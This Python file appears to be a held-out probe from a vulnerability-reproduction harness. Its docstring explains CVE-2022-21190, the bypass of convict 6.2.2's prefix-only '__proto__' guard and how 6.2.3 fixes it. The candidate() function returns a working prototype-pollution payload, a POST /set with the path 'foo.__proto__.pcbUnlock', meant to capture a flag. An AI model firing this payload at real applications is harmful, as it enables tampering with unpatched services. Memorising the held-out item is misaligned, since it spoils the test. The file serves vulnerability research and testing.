#!/usr/bin/env python3
r"""[HELD-OUT] CVE-2022-21190 residual -- prepended-segment bypass of the convict@6.2.2 fix.

real-app-http: fired as REAL EXTERNAL HTTP against the running Express service:
  POST /set  {"path": "foo.__proto__.pcbUnlock", "value": "unlocked"}
then GET /check observes whether Object.prototype was polluted. The service calls the REAL published
convict config.set(path, value) on the attacker JSON -- no in-process probe, no source-lift.

The CVE-2022-22143 fix (present on V1 = convict 6.2.2) guards config keys with a `startsWith` check
ANCHORED to the START of the key:

    const FORBIDDEN_KEY_PATHS = ['__proto__', 'this.constructor.prototype']
    for (const path of FORBIDDEN_KEY_PATHS) if (k.startsWith(`${path}.`)) return this

It fires ONLY when the key BEGINS with '__proto__.' (or 'this.constructor.prototype.'); it never
inspects a '__proto__' segment appearing LATER in the path. PREPENDING any benign segment + dot defeats
it: `foo.__proto__.pcbUnlock` does NOT start with '__proto__.' (it starts with 'foo.'), so the guard is
silent and set() proceeds to `walk(this._instance, 'foo.__proto__', true)`: the walk creates `foo` as a
fresh `{}`, then dereferences `foo.__proto__` (= Object.prototype, which is present so the walk follows
it), and the leaf assignment `parent['pcbUnlock'] = value` writes `pcbUnlock` onto Object.prototype --
GLOBAL prototype pollution. A later GET /check sees `({}).pcbUnlock !== undefined` and releases the flag
on V1 = CVE-2022-21190.

GHSA-jjf5-wx3j-3fv7 (CVE-2022-21190) states this is 'a bypass of CVE-2022-22143 [because] the fix
introduced relies on the startsWith method and does not prevent the vulnerability.'

CVE-2022-21190 fix (V2 = convict 6.2.3) gives each FORBIDDEN_KEY_PATH a TRAILING dot
(['__proto__.', 'this.constructor.prototype.']) and returns when
`k.startsWith(forbidden) || k.includes(`.${forbidden}`)`. 'foo.__proto__.pcbUnlock' matches
`.includes('.__proto__.')`, so the dangerous segment is caught ANYWHERE -- BLOCKED before any write
(POST /set blocked, /check stays null, no flag).

Contract: reaches the flag on V1; closed on V2.
"""
from __future__ import annotations


def candidate(flag: str) -> dict:
    """A POST /set whose dotted path PREPENDS a benign segment before '__proto__' so the dangerous
    segment appears where the startsWith('__proto__.') prefix guard never looks."""
    return {
        "probe_id": "cve-2022-21190-prepended-proto",
        "method": "POST",
        "path_route": "/set",
        "path": "foo.__proto__.pcbUnlock",
        "value": "unlocked",
    }


if __name__ == "__main__":
    print(candidate("PCBFLAG_demo"))
